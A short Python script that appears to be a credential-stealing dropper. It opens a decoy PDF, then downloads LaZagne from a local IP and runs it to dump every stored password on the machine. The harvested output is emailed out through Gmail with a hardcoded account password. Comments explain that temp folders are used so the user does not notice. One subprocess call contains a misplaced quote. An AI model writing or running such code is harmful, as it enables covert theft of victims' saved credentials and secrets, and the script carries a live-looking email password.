import requests ,subprocess, smtplib, tempfile, os

def download(url):
    get_result = requests.get(url)


    filename = url.split("/")[-1]

    with open(filename, "wb") as out_file:
        out_file.write(get_result.content)

def send_mail(email, password, message):
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("http://192.168.0.108/file/sample.pdf")
subprocess.Popen("sample.pdf, shell=True")

#should not download to the current directory because it can be suspicious to the user so temporary filez
#os module is cross-platform will work on linux, windows
download("http://192.168.0.108/file/lazagne.exe")

result = subprocess.check_output("lazagne.exe all", shell=True)

send_mail("vicrontest@gmail.com", "eofqfifjzdoiol", result)

#app-generated password eofqfifjzdoiol
